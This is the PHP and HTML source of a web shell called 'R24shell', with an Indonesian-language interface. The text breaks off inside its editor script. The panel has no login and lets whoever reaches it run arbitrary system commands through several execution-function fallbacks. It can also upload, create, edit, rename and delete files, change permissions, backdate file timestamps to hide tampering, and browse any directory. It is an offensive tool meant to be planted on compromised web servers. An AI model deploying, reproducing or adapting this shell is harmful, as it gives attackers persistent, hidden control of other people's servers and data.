<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>R24ˢʰᵉˡˡ</title>
    <meta name="robots" content="noindex,nofollow">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-GLhlTQ8iRABdZLl6O3oVMWSktQOp6b7In1Zl3/Jr59b6EGGoI1aFkw7cmDA6j6gD" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha512-SzlrxWUlpfuzQ+pcUCosxcglQRNAq/DZjVsC0lE40xsADsfeQoEypE+enwcOiGjk/bSuGGKHEyjSoQ1zVisanQ==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/codemirror.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/theme/dracula.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/theme/monokai.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/codemirror.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/php/php.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/htmlmixed/htmlmixed.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/css/css.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/javascript/javascript.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/xml/xml.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/clike/clike.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/python/python.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/sql/sql.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/shell/shell.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/yaml/yaml.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/json/json.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/markdown/markdown.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/addon/edit/matchbrackets.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/addon/edit/closebrackets.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/addon/selection/active-line.min.js"></script>
    <style>body{background-color:#1a1a1a;color:#fff}.main-container{padding-left:50px;padding-right:50px;margin-top:20px}.navbar{background-color:#2d2d2d!important;border-bottom:2px solid #007bff;padding:10px 15px;flex-wrap:wrap}.navbar-container{display:flex;flex-direction:column;width:100%}.navbar-top{display:flex;justify-content:space-between;align-items:center;width:100%;margin-bottom:-20px}.navbar-bottom{display:flex;flex-direction:column;width:100%;gap:10px}.system-info{color:#ffc107;font-size:.9em;font-family:monospace}.path-info{color:#fff;font-size:1em;display:flex;align-items:center;gap:5px}.path-label{color:#ffc107;font-weight:700;padding:3px 8px;font-size:.9em}.path-value{color:#fff}.path-info a{color:#fff;text-decoration:none}.path-info a:hover{color:#ffc107;text-decoration:underline}.nav-buttons{display:flex;gap:10px;flex-wrap:wrap}.navbar-brand{display:flex;align-items:center;gap:10px}.logo-container{width:180px;height:70px;right:99px;top:50px;position:relative;margin-left:auto}.logo{font-family:"Arial Black","Segoe UI Black","Impact","Noto Sans","Arial Unicode MS",sans-serif;font-weight:900;display:inline-flex;align-items:flex-start;position:relative;transform:scale(.4);transform-origin:top right;position:absolute;top:-20px;right:-30px}.logo::after{content:"";position:absolute;bottom:32px;left:142px;width:58%;height:7px;background:#fff;border-radius:5px}.main{letter-spacing:-8px;display:flex;align-items:flex-end}.kanji{font-size:150px;color:gold;text-shadow:1px 0 currentColor,-1px 0 currentColor,0 1px currentColor,0 -1px currentColor}.num{font-size:110px;color:#ff2b2b;margin-left:4px;transform:translateY(-6px);text-shadow:1px 0 currentColor,-1px 0 currentColor,0 1px currentColor,0 -1px currentColor}.sup{font-size:46px;margin-left:-2px;transform:translateY(-45px);margin-top:143px;color:#fff;font-weight:900}.btn-dark{background-color:#28a745;border-color:#1e7e34;color:#fff;font-weight:700}.btn-dark:hover{background-color:#1e7e34;border-color:#1e7e34}.btn-success{background-color:#28a745;border-color:#1e7e34;color:#fff;font-weight:700}.btn-success:hover{background-color:#1e7e34;border-color:#1e7e34}.btn-info{background-color:#28a745;border-color:#1e7e34;color:#fff;font-weight:700}.btn-info:hover{background-color:#1e7e34;border-color:#1e7e34;color:#fff}.btn-cmd{background-color:#28a745;border-color:#1e7e34;color:#fff;font-weight:700}.btn-cmd:hover{background-color:#1e7e34;border-color:#1e7e34;color:#fff}.btn-warning{background-color:#ffc107;border-color:#b38f00;color:#000;font-weight:700}.btn-warning:hover{background-color:#b38f00;border-color:#8a6d00;color:#fff}.table{color:#fff;background-color:#2d2d2d;border-collapse:collapse;width:100%;margin-bottom:30px}.table thead th{background-color:#ffc107!important;color:#000000!important;font-weight:700;border:1px solid #007bff;position:sticky;top:0;z-index:10}.table tbody tr{border:1px solid #007bff}.table tbody tr:hover{background-color:#3d3d3d}.table td,.table th{border:1px solid #007bff;padding:12px;vertical-align:middle}.table tbody tr:hover td:nth-child(1),.table tbody tr:hover td:nth-child(2),.table tbody tr:hover td:nth-child(3){color:#ffc107!important}.table tbody tr:hover td:nth-child(1) a,.table tbody tr:hover td:nth-child(1) i,.table tbody tr:hover td:nth-child(2),.table tbody tr:hover td:nth-child(3){color:#ffc107!important}.table td a{color:#fff;text-decoration:none}.table td a:hover{color:#007bff}.perms-not-writable{color:#adb5bd!important;font-weight:700;opacity:.7}.perms-safe{color:#4caf50!important;font-weight:700}.perms-info{color:#17a2b8!important;font-weight:700}.perms-warning{color:#ffc107!important;font-weight:700}.perms-danger{color:#f44336!important;font-weight:700}.table td a i{color:#fff;margin:0 5px;font-size:1.1em;transition:color 0.2s ease}.table td a i:hover{color:#ffc107!important}.table td a i.fa-key{color:#fff}.table td a i.fa-key:hover{color:#ffc107!important}.date-picker-form,.create-folder-form,.upload-form,.rename-form,.create-file-form,.cmd-form,.chmod-form{background:#2d2d2d;padding:20px;border-radius:5px;margin:20px 0;border:1px solid #007bff;color:#fff}.current-date{color:#adb5bd;font-size:.9em;margin-bottom:10px}.date-example{color:#adb5bd;font-size:.85em;margin-top:5px}.form-control{background-color:#3d3d3d;border:1px solid #007bff;color:#fff}.form-control:focus{background-color:#4d4d4d;border-color:#ffc107;color:#fff;box-shadow:0 0 0 .2rem rgb(255 193 7 / .25)}.form-control::placeholder{color:#adb5bd}label{color:#fff;font-weight:700}.btn-primary{background-color:#28a745;border-color:#1e7e34;color:#fff}.btn-primary:hover{background-color:#1e7e34;border-color:#1e7e34}.btn-secondary{background-color:#6c757d;border-color:#545b62;color:#fff}.btn-secondary:hover{background-color:#545b62;border-color:#3d4248}i.fa-regular.fa-file,i.fa-solid.fa-terminal,i.fa-solid.fa-house,i.fa-solid.fa-upload,.fa-folder{color:#ffc107;margin-right:5px}.fa-solid,.fa-regular,.fa-brands{margin-right:5px}i.fa.fa-trash,i.fa-regular.fa-calendar,i.fa-sharp.fa-regular.fa-pen-to-square,i.fa-solid.fa-file-pen{color:#fff}i.fa.fa-trash:hover{color:#f44336}i.fa-regular.fa-calendar:hover{color:#ffc107}i.fa-sharp.fa-regular.fa-pen-to-square:hover{color:#ffc107}i.fa-solid.fa-file-pen:hover{color:#ffc107}a{color:#007bff}a:hover{color:#ffc107}.alert{background-color:#2d2d2d;border:1px solid #007bff;color:#fff}::-webkit-scrollbar{width:10px;height:10px}::-webkit-scrollbar-track{background:#2d2d2d}::-webkit-scrollbar-thumb{background:#ffea00;border-radius:5px}::-webkit-scrollbar-thumb:hover{background:#b38f00}.file-name-link{color:#fff;text-decoration:none;cursor:pointer}.file-name-link:hover{color:#007bff}.edit-mode{background-color:#2d2d2d;padding:30px;border-radius:5px;border:1px solid #007bff;margin:20px 0}.edit-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:20px}.edit-header h3{color:#ffc107;margin:0}.edit-footer{display:flex;gap:10px;margin-top:20px}.CodeMirror{height:500px;border:1px solid #007bff;border-radius:5px;font-family:'Monaco','Menlo','Ubuntu Mono','Consolas',monospace;font-size:14px;line-height:1.6}.CodeMirror-gutters{background-color:#2d2d2d;border-right:1px solid #007bff}.CodeMirror-linenumber{color:#ffc107}.CodeMirror-cursor{border-left:2px solid #ffc107}.CodeMirror-selected{background-color:#4d4d4d!important}.editor-info{background-color:#3d3d3d;padding:10px;border-radius:5px;margin-top:10px;font-size:.9em;color:#adb5bd;display:flex;justify-content:space-between;align-items:center}.editor-language{color:#ffc107;font-weight:700}.terminal-output{background-color:#1a1a1a;border:1px solid lime;border-radius:5px;padding:15px;margin-bottom:15px;font-family:'Courier New',monospace;font-size:14px;color:lime;max-height:400px;overflow-y:auto}.terminal-error{background-color:#1a1a1a;border:1px solid #ff6b6b;border-radius:5px;padding:15px;margin-bottom:15px;font-family:'Courier New',monospace;font-size:14px;color:#ff6b6b;max-height:400px;overflow-y:auto}.terminal-output pre,.terminal-error pre{margin:0;background-color:#fff0;border:none;padding:0;white-space:pre-wrap;word-wrap:break-word}.terminal-prompt{color:#ffc107;font-weight:700}.chmod-preview{background-color:#3d3d3d;padding:15px;border-radius:5px;margin:15px 0;border-left:4px solid #ffc107}.current-perms-badge{display:inline-block;padding:5px 10px;border-radius:4px;font-family:monospace;font-size:1.1em;margin-right:10px;background-color:#1a1a1a;border:1px solid #ffc107}@media (max-width:768px){.main-container{padding-left:15px;padding-right:15px}.navbar-top{flex-direction:column;gap:10px;align-items:flex-start}.nav-buttons{flex-wrap:wrap}.logo-container{width:100%;margin-left:35}.logo{transform:scale(.25);top:-30px;right:-40px}.path-info{flex-wrap:wrap}}</style>
</head>
<body>
<?php function isWritable($path){return is_writable($path);}function getPermsColorClass($perms,$path){$perms_value=(int)$perms;$writable=isWritable($path);if(!$writable){return 'perms-not-writable';}if($perms_value<=644){return 'perms-safe';}elseif($perms_value>=645&&$perms_value<=654){return 'perms-info';}elseif($perms_value>=655&&$perms_value<=664){return 'perms-warning';}elseif($perms_value>=665&&$perms_value<=666){return 'perms-danger';}elseif($perms_value==755){return 'perms-safe';}elseif($perms_value>=767&&$perms_value<=777){return 'perms-danger';}else{if(substr($perms,-1)>=6){return 'perms-warning';}elseif(substr($perms,-2,1)>=6){return 'perms-info';}else{return 'perms-safe';}}}function chmodPath($path,$perms){if(file_exists($path)){$octal_perms=octdec($perms);return chmod($path,$octal_perms);}return false;}function formatSizeUnits($bytes){if($bytes>=1073741824){$bytes=number_format($bytes/1073741824,2).' GB';}elseif($bytes>=1048576){$bytes=number_format($bytes/1048576,2).' MB';}elseif($bytes>=1024){$bytes=number_format($bytes/1024,2).' KB';}elseif($bytes>1){$bytes=$bytes.' bytes';}elseif($bytes==1){$bytes=$bytes.' byte';}else{$bytes='0 bytes';}return $bytes;}function fileExtension($file){return substr(strrchr($file,'.'),1);}function fileIcon($file){$imgs=array("apng","avif","gif","jpg","jpeg","jfif","pjpeg","pjp","png","svg","webp");$audio=array("wav","m4a","m4b","mp3","ogg","webm","mpc");$ext=strtolower(fileExtension($file));if($file=="error_log"){return '<i class="fa-sharp fa-solid fa-bug" style="color: #f44336;"></i> ';}elseif($file==".htaccess"){return '<i class="fa-solid fa-hammer" style="color: #ffc107;"></i> ';}if($ext=="html"||$ext=="htm"){return '<i class="fa-brands fa-html5" style="color: #f44336;"></i> ';}elseif($ext=="php"||$ext=="phtml"){return '<i class="fa-brands fa-php" style="color: #4caf50;"></i> ';}elseif(in_array($ext,$imgs)){return '<i class="fa-regular fa-images" style="color: #ffc107;"></i> ';}elseif($ext=="css"){return '<i class="fa-brands fa-css3" style="color: #17a2b8;"></i> ';}elseif($ext=="txt"){return '<i class="fa-regular fa-file-lines" style="color: #adb5bd;"></i> ';}elseif(in_array($ext,$audio)){return '<i class="fa-duotone fa-file-music" style="color: #ffc107;"></i> ';}elseif($ext=="py"){return '<i class="fa-brands fa-python" style="color: #ffc107;"></i> ';}elseif($ext=="js"){return '<i class="fa-brands fa-js" style="color: #ffc107;"></i> ';}elseif($ext=="zip"||$ext=="rar"||$ext=="7z"||$ext=="tar"||$ext=="gz"){return '<i class="fa-regular fa-file-zipper" style="color: #a207ff;"></i> ';}else{return '<i class="fa-solid fa-file" style="color: #adb5bd;"></i> ';}}function encodePath($path){$a=array("/","\\",".",":");$b=array("ক","খ","গ","ঘ");return str_replace($a,$b,$path);}function decodePath($path){$a=array("/","\\",".",":");$b=array("ক","খ","গ","ঘ");return str_replace($b,$a,$path);}function getCodeMirrorMode($ext){$modes=['php'=>'php','phtml'=>'php','html'=>'htmlmixed','htm'=>'htmlmixed','css'=>'css','js'=>'javascript','jsx'=>'javascript','ts'=>'javascript','tsx'=>'javascript','py'=>'python','rb'=>'ruby','java'=>'clike','c'=>'clike','cpp'=>'clike','cs'=>'clike','go'=>'go','rs'=>'rust','sql'=>'sql','json'=>'json','xml'=>'xml','svg'=>'xml','yaml'=>'yaml','yml'=>'yaml','md'=>'markdown','sh'=>'shell','bash'=>'shell','zsh'=>'shell',];return isset($modes[$ext])?$modes[$ext]:'htmlmixed';}function unzipFile($zip_file,$destination){if(!class_exists('ZipArchive')){return false;}$zip=new ZipArchive;if($zip->open($zip_file)===TRUE){$zip->extractTo($destination);$zip->close();return true;}return false;}function deleteDirectory($dir){if(!file_exists($dir)){return true;}if(!is_dir($dir)){return unlink($dir);}foreach(scandir($dir)as $item){if($item=='.'||$item=='..'){continue;}if(!deleteDirectory($dir.DIRECTORY_SEPARATOR.$item)){return false;}}return rmdir($dir);}function executeCommand($cmd){$output='';$return_var=-1;if(function_exists('shell_exec')){$output=shell_exec($cmd." 2>&1");$return_var=($output===null)?1:0;}elseif(function_exists('exec')){exec($cmd." 2>&1",$output_array,$return_var);$output=implode("\n",$output_array);}elseif(function_exists('system')){ob_start();system($cmd." 2>&1",$return_var);$output=ob_get_clean();}elseif(function_exists('passthru')){ob_start();passthru($cmd." 2>&1",$return_var);$output=ob_get_clean();}elseif(function_exists('proc_open')){$descriptorspec=[0=>["pipe","r"],1=>["pipe","w"],2=>["pipe","w"]];$process=proc_open($cmd,$descriptorspec,$pipes,PATH,null);if(is_resource($process)){$output=stream_get_contents($pipes[1]);$error=stream_get_contents($pipes[2]);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);$return_var=proc_close($process);if(!empty($error)){$output=$error;}}else{$output="Error: Failed to open process";$return_var=1;}}else{$output="commands proc_open function is disabled!!";$return_var=1;}return['output'=>$output,'return_var'=>$return_var];}$root_path=__DIR__;if(isset($_GET['p'])){if(empty($_GET['p'])){$p=$root_path;}elseif(!is_dir(decodePath($_GET['p']))){echo("<script>\nalert('Directory is Corrupted and Unreadable.');\nwindow.location.replace('?');\n</script>");}elseif(is_dir(decodePath($_GET['p']))){$p=decodePath($_GET['p']);}}elseif(isset($_GET['q'])){if(!is_dir(decodePath($_GET['q']))){echo("<script>window.location.replace('?p=');</script>");}elseif(is_dir(decodePath($_GET['q']))){$p=decodePath($_GET['q']);}}else{$p=$root_path;}define("PATH",$p);$system_info=php_uname("a");$path=str_replace('\\','/',PATH);$paths=explode('/',$path);$path_breadcrumb='';foreach($paths as $id=>$dir_part){if($dir_part==''&&$id==0){$path_breadcrumb.="<a href=\"?p=/\">/</a>";continue;}if($dir_part=='')continue;$path_breadcrumb.="<a href='?p=";for($i=0;$i<=$id;$i++){$path_breadcrumb.=str_replace(":","ঘ",$paths[$i]);if($i!=$id)$path_breadcrumb.="ক";}$path_breadcrumb.="'>".$dir_part."</a>/";}echo('
<nav class="navbar navbar-light">
    <div class="navbar-container">
        <div class="navbar-top">
            <div class="navbar-brand">
                <a href="?"><img src="https://github.com/fluidicon.png" width="30" height="30" alt="" style="filter: invert(1);"></a>
                <span class="system-info">'.$system_info.'</span>
            </div>
            <div class="logo-container">
                <div class="logo">
                    <span class="main">
                        <span class="kanji">尺</span><span class="num">24</span>
                    </span>
                    <span class="sup">ˢʰᵉˡˡ</span>
                </div>
            </div>
        </div>
        <div class="navbar-bottom">
            <div class="path-info">
                <span class="path-label">path :</span>
                <span class="path-value">'.$path_breadcrumb.'</span>
            </div>
            <div class="nav-buttons">
                <a href="?"><button type="button" class="btn btn-dark"><i class="fa-solid fa-house"></i> HOME</button></a>
                <a href="?upxc&q='.urlencode(encodePath(PATH)).'"><button class="btn btn-dark" type="button"><i class="fa-solid fa-upload"></i> Upload File</button></a>
                <a href="?createfolder&q='.urlencode(encodePath(PATH)).'"><button class="btn btn-success" type="button"><i class="fa-regular fa-folder"></i> Create Folder</button></a>
                <a href="?createfile&q='.urlencode(encodePath(PATH)).'"><button class="btn btn-info" type="button"><i class="fa-regular fa-file"></i> New File</button></a>
                <a href="?cmd&q='.urlencode(encodePath(PATH)).'"><button class="btn btn-cmd" type="button"><i class="fa-solid fa-terminal"></i>CMD</button></a>
            </div>
        </div>
    </div>
</nav>');if(isset($_GET['chmod'])&&isset($_GET['q'])){$item_name=$_GET['chmod'];$item_path=PATH."/".$item_name;$current_perms="0".substr(decoct(fileperms($item_path)),-3);echo '
    <div class="main-container">
        <div class="chmod-form">
            <h5 style="color: #ffc107;"><i class="fa-solid fa-key"></i> Change Permissions: '.htmlspecialchars($item_name).'</h5>
            
            <div class="chmod-preview">
                <div style="display: flex; align-items: center; flex-wrap: wrap; gap: 15px;">
                    <span class="current-perms-badge">Current: '.$current_perms.'</span>
                    <span style="color: #adb5bd;">'.(is_writable($item_path)?'<i class="fa-solid fa-check" style="color: #4caf50;"></i> Writable':'<i class="fa-solid fa-lock" style="color: #f44336;"></i> Read Only').'</span>
                </div>
            </div>
            
            <form method="post" id="chmodForm">
                <div class="row">
                    <div class="col-md-12">
                        <label for="permissions">Permissions (Octal):</label>
                        <div class="input-group mb-3">
                            <span class="input-group-text" style="background-color: #3d3d3d; color: #ffc107; border: 1px solid #007bff;">0</span>
                            <input type="text" class="form-control" id="permissions" name="permissions" 
                                   value="'.substr($current_perms,1).'" 
                                   placeholder="755" maxlength="3" 
                                   style="font-family: monospace; max-width: 100px;" 
                                   pattern="[0-7]{3}" title="Masukkan 3 digit angka octal (0-7)" required>
                            <span class="input-group-text" style="background-color: #3d3d3d; color: #ffffff; border: 1px solid #007bff;">
                                Contoh: 755, 644, 777
                            </span>
                        </div>
                    </div>
                </div>
                
                <div class="mt-3">
                    <button type="submit" class="btn btn-warning" name="change_perms" style="background-color: #ffc107; color: #000; border-color: #b38f00;">
                        <i class="fa-solid fa-key"></i> Change Permissions
                    </button>
                    <a href="?p='.encodePath(PATH).'" class="btn btn-secondary">
                        <i class="fa-solid fa-times"></i> Cancel
                    </a>
                </div>
            </form>
        </div>
    </div>';if(isset($_POST['change_perms'])){$new_perms=$_POST['permissions'];if(preg_match('/^[0-7]{3}$/',$new_perms)){if(chmodPath($item_path,$new_perms)){echo("<script>alert('Permissions berhasil diubah menjadi 0".$new_perms."'); window.location.replace('?p=".encodePath(PATH)."');</script>");}else{echo("<script>alert('Gagal mengubah permissions. Mungkin Anda tidak memiliki akses untuk mengubah permissions file/folder ini.'); window.location.replace('?p=".encodePath(PATH)."');</script>");}}else{echo("<script>alert('Format permission tidak valid! Gunakan 3 digit angka octal (0-7). Contoh: 755, 644, 777'); window.location.replace('?p=".encodePath(PATH)."&chmod=".urlencode($item_name)."');</script>");}}}if(isset($_GET['cmd'])&&isset($_GET['q'])){$current_dir=PATH;$output='';$command='';$return_var=0;if(isset($_POST['execute_cmd'])){$command=$_POST['command'];$old_dir=getcwd();if(chdir($current_dir)){if(function_exists('shell_exec')){$output=shell_exec($command." 2>&1");$return_var=($output===null)?1:0;}elseif(function_exists('exec')){exec($command." 2>&1",$output_array,$return_var);$output=implode("\n",$output_array);}elseif(function_exists('system')){ob_start();system($command." 2>&1",$return_var);$output=ob_get_clean();}elseif(function_exists('passthru')){ob_start();passthru($command." 2>&1",$return_var);$output=ob_get_clean();}elseif(function_exists('proc_open')){$descriptorspec=[0=>["pipe","r"],1=>["pipe","w"],2=>["pipe","w"]];$process=proc_open($command,$descriptorspec,$pipes,$current_dir,null);if(is_resource($process)){$output=stream_get_contents($pipes[1]);$error=stream_get_contents($pipes[2]);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);$return_var=proc_close($process);if(!empty($error)){$output=$error;}}else{$output="Error: Failed to open process";$return_var=1;}}else{$output="ERROR: Semua fungsi command execution dinonaktifkan oleh server!";$return_var=1;}chdir($old_dir);}else{$output="Error: Tidak dapat mengakses direktori ".$current_dir;$return_var=1;}if(empty(trim($output))){$output="Command executed successfully";}}echo '
    <div class="main-container">
        <div class="cmd-form">
            <h5 style="color: #ffc107;"><i class="fa-solid fa-terminal"></i> Command Line</h5>
            
            <form method="post">
                <div class="row">
                    <div class="col-md-10">
                        <div class="input-group mb-3">
                            <span class="input-group-text" style="background-color: #3d3d3d; color: #ffc107; border: 1px solid #007bff; font-weight: bold;">$</span>
                            <input type="text" class="form-control" name="command" placeholder="ls -la" value="'.htmlspecialchars($command).'" required autofocus style="font-family: monospace; max-width: 300px;">
                            <button type="submit" class="btn btn-cmd" name="execute_cmd"><i class="fa-solid fa-play"></i> Execute</button>
                            <a href="?p='.encodePath(PATH).'" class="btn btn-secondary"><i class="fa-solid fa-times"></i> Close</a>
                        </div>
                    </div>
                </div>
            </form>';if(!empty($command)){echo '<div class="terminal-output" style="border-color: #ffc107;">';echo '<div style="border-bottom: 1px solid #007bff; padding-bottom: 8px; margin-bottom: 8px;">';echo '<span style="color: #ffc107;">$</span> <span style="color: #ffffff;">'.htmlspecialchars($command).'</span>';echo '</div>';echo '<pre style="margin: 0; color: #ffffff; font-family: monospace;">'.htmlspecialchars($output).'</pre>';echo '</div>';}echo '</div></div>';}if(isset($_GET['createfolder'])&&isset($_GET['q'])){echo '
    <div class="main-container">
        <div class="create-folder-form">
            <h5 style="color: #ffc107;"><i class="fa-regular fa-folder"></i> Create New Folder</h5>
            <form method="post">
                <div class="row">
                    <div class="col-md-6">
                        <label for="folder_name">Folder name:</label>
                        <input type="text" class="form-control" name="folder_name" placeholder="Enter folder name" required autofocus>
                    </div>
                    <div class="col-md-12 mt-3">
                        <input type="submit" class="btn btn-success" name="create_folder" value="Create Folder">
                        <a href="?p='.encodePath(PATH).'" class="btn btn-secondary">Batal</a>
                    </div>
                </div>
            </form>
        </div>
    </div>';if(isset($_POST['create_folder'])){$folder_name=$_POST['folder_name'];$folder_path=PATH."/".$folder_name;if(!empty($folder_name)){if(!file_exists($folder_path)){if(mkdir($folder_path,0755)){echo("<script>alert('Folder berhasil dibuat: ".addslashes($folder_name)."'); window.location.replace('?p=".encodePath(PATH)."');</script>");}else{echo("<script>alert('Gagal membuat folder.'); window.location.replace('?p=".encodePath(PATH)."');</script>");}}else{echo("<script>alert('Folder dengan nama tersebut sudah ada!'); window.location.replace('?p=".encodePath(PATH)."');</script>");}}else{echo("<script>alert('Nama folder tidak boleh kosong!'); window.location.replace('?p=".encodePath(PATH)."');</script>");}}}if(isset($_GET['createfile'])&&isset($_GET['q'])){echo '
    <div class="main-container">
        <div class="create-file-form">
            <h5 style="color: #ffc107;"><i class="fa-regular fa-file"></i> Create New File</h5>
            <form method="post">
                <div class="row">
                    <div class="col-md-6">
                        <label for="file_name">File name:</label>
                        <input type="text" class="form-control" name="file_name" placeholder="Contoh: index.php, style.css, readme.txt" required autofocus>
                        <div class="date-example">Gunakan ekstensi file yang sesuai</div>
                    </div>
                    <div class="col-md-12 mt-3">
                        <label for="file_content">File content:</label>
                        <textarea class="form-control" name="file_content" rows="5" placeholder="Isi file"></textarea>
                    </div>
                    <div class="col-md-12 mt-3">
                        <input type="submit" class="btn btn-info" name="create_file" value="Create File">
                        <a href="?p='.encodePath(PATH).'" class="btn btn-secondary">Batal</a>
                    </div>
                </div>
            </form>
        </div>
    </div>';if(isset($_POST['create_file'])){$file_name=$_POST['file_name'];$file_content=$_POST['file_content'];$file_path=PATH."/".$file_name;if(!empty($file_name)){if(!file_exists($file_path)){$file=fopen($file_path,"w");if($file){fwrite($file,$file_content);fclose($file);echo("<script>alert('File berhasil dibuat: ".addslashes($file_name)."'); window.location.replace('?p=".encodePath(PATH)."');</script>");}else{echo("<script>alert('Gagal membuat file.'); window.location.replace('?p=".encodePath(PATH)."');</script>");}}else{echo("<script>alert('File dengan nama tersebut sudah ada!'); window.location.replace('?p=".encodePath(PATH)."');</script>");}}else{echo("<script>alert('Nama file tidak boleh kosong!'); window.location.replace('?p=".encodePath(PATH)."');</script>");}}}if(isset($_GET['upxc'])&&isset($_GET['q'])){echo '
    <div class="main-container">
        <div class="upload-form">
            <h5 style="color: #ffc107;"><i class="fa-solid fa-upload"></i> Upload File</h5>
            <form method="post" enctype="multipart/form-data">
                <div class="row">
                    <div class="col-md-6">
                        <label for="bnexazabi">Select file:</label>
                        <input type="file" class="form-control" name="bnexazabi" id="bnexazabi" required>
                    </div>
                    <div class="col-md-12 mt-3">
                        <input type="submit" class="btn btn-primary" value="Upload File" name="upofile">
                        <a href="?p='.encodePath(PATH).'" class="btn btn-secondary">Batal</a>
                    </div>
                </div>
            </form>
        </div>
    </div>';}if(isset($_GET['r'])&&isset($_GET['q'])){echo '
    <div class="main-container">
        <div class="rename-form">
            <h5 style="color: #ffc107;"><i class="fa-sharp fa-regular fa-pen-to-square"></i> Rename: '.htmlspecialchars($_GET['r']).'</h5>
            <form method="post">
                <div class="row">
                    <div class="col-md-6">
                        <label for="name">New name:</label>
                        <input type="text" class="form-control" name="name" value="'.htmlspecialchars($_GET['r']).'" required autofocus>
                    </div>
                    <div class="col-md-12 mt-3">
                        <input type="submit" class="btn btn-primary" value="Rename" name="rename">
                        <a href="?p='.encodePath(PATH).'" class="btn btn-secondary">Batal</a>
                    </div>
                </div>
            </form>
        </div>
    </div>';if(isset($_POST['rename'])){$name=PATH."/".$_GET['r'];if(rename($name,PATH."/".$_POST['name'])){echo("<script>alert('Renamed.'); window.location.replace('?p=".encodePath(PATH)."');</script>");}else{echo("<script>alert('Some error occurred.'); window.location.replace('?p=".encodePath(PATH)."');</script>");}}}if(isset($_GET['t'])&&isset($_GET['q'])){$item_name=$_GET['t'];$item_path=PATH."/".$item_name;$current_time=filemtime($item_path);echo '
    <div class="main-container">
        <div class="date-picker-form">
            <h5 style="color: #ffc107;"><i class="fa-regular fa-calendar"></i> Ubah Tanggal Modified: '.htmlspecialchars($item_name).'</h5>
            <div class="current-date">Current date: '.date("F d Y H:i:s",$current_time).'</div>
            <form method="post">
                <div class="row">
                    <div class="col-md-6">
                        <label for="new_date">New date:</label>
                        <input type="text" class="form-control" name="new_date" placeholder="Contoh: December 06 2025 19:21:40" value="'.date("F d Y H:i:s",$current_time).'" required>
                        <div class="date-example">Format: December 06 2025 19:21:40</div>
                    </div>
                    <div class="col-md-12 mt-3">
                        <input type="submit" class="btn btn-primary" name="change_date" value="Ubah Tanggal">
                        <a href="?p='.encodePath(PATH).'" class="btn btn-secondary">Batal</a>
                    </div>
                </div>
            </form>
        </div>
    </div>';if(isset($_POST['change_date'])){$new_date=strtotime($_POST['new_date']);if($new_date!==false&&$new_date!=-1){if(touch($item_path,$new_date)){echo("<script>alert('Tanggal modified berhasil diubah menjadi: ".date("F d Y H:i:s",$new_date)."'); window.location.replace('?p=".encodePath(PATH)."');</script>");}else{echo("<script>alert('Gagal mengubah tanggal modified.'); window.location.replace('?p=".encodePath(PATH)."');</script>");}}else{echo("<script>alert('Format tanggal tidak valid! Gunakan format seperti: December 06 2025 19:21:40'); window.location.replace('?p=".encodePath(PATH)."&t=".urlencode($item_name)."');</script>");}}}if(isset($_GET['e'])&&isset($_GET['q'])&&!isset($_GET['p'])){$edit_file=$_GET['e'];$edit_path=PATH."/".$edit_file;$ext=strtolower(fileExtension($edit_file));$mode=getCodeMirrorMode($ext);$file_content=htmlspecialchars(file_get_contents($edit_path),ENT_QUOTES,'UTF-8');if(is_file($edit_path)){echo '
        <div class="main-container">
            <div class="edit-mode">
                <div class="edit-header">
                    <h3><i class="fa-solid fa-file-pen"></i> Editing: '.htmlspecialchars($edit_file).'</h3>
                </div>
                
                <form method="post" id="editorForm">
                    <div class="code-editor-container">
                        <textarea id="codeEditor" name="data" style="display: none;">'.$file_content.'</textarea>
                        <div id="codemirror-editor"></div>
                    </div>
                    
                    <div class="editor-info">
                        <span><i class="fa-solid fa-code"></i> Mode: <span class="editor-language">'.strtoupper($ext).'</span></span>
                        <span><i class="fa-regular fa-keyboard"></i> Line: <span id="lineCount">0</span> | Column: <span id="colCount">0</span></span>
                    </div>
                    
                    <div class="edit-footer">
                        <button type="submit" class="btn btn-success" name="edit" id="saveButton"><i class="fa-solid fa-floppy-disk"></i> Simpan Perubahan</button>
                        <a href="?p='.encodePath(PATH).'" class="btn btn-secondary"><i class="fa-solid fa-times"></i> Batal</a>
                    </div>
                </form>
            </div>
        </div>
        
        <script>
            var editor = CodeMirror(document.getElementById("codemirror-editor"), {
